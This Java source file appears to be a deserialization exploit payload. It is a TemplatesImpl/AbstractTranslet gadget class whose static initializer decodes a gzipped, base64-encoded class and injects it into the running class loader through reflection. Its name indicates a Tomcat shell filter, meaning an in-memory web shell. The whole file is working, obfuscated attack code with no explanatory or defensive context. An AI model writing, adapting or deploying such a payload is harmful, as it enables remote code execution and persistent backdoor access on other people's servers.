package com.xhstormr.app;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.lang.reflect.Method;
import java.util.Base64;
import java.util.zip.GZIPInputStream;

public class TomcatShellFilterTemplatesImpl extends AbstractTranslet {

    static {
        try {
            String base64 = "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";
            byte[] bytes = ungzip(Base64.getDecoder().decode(base64));
            ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
            Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            defineClass.setAccessible(true);
            ((Class<?>) defineClass.invoke(classLoader, bytes, 0, bytes.length)).newInstance().equals(classLoader);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private static byte[] ungzip(byte[] bytes) throws Exception {
        GZIPInputStream in = new GZIPInputStream(new ByteArrayInputStream(bytes));
        ByteArrayOutputStream out = new ByteArrayOutputStream();

        byte[] buf = new byte[2 * 1024];
        for (int read; (read = in.read(buf)) != -1; ) {
            out.write(buf, 0, read);
        }

        return out.toByteArray();
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
    }
}
